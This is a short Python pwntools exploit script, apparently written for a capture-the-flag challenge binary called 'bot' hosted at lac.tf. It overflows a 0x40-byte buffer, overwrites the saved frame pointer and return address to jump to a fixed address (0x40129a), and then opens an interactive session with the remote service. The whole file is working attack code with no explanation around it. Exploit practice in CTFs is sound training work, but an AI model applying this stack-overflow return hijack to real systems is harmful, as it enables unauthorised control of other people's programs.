from pwn import *

exe = ELF("bot")
# exe_rop = ROP(exe)
# libc = ELF("libc.so.6")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def wait(*msg):
    if args.LOCAL and args.R2:
        input(" ".join(map(str,msg)))
    else:
        time.sleep(0.2)

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("lac.tf", 31180)
    return r


io = start()
# pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]
# print("pop rdi ret ",hex(pop_rdi_ret_addr))
payload = b"give me the flag".ljust(0x40,b"\x00")
payload += flat({
    0: [
    0,
    0x0040129a
    ]
    })
lp(payload)
io.sendlineafter(b"help?\n",payload)

io.interactive()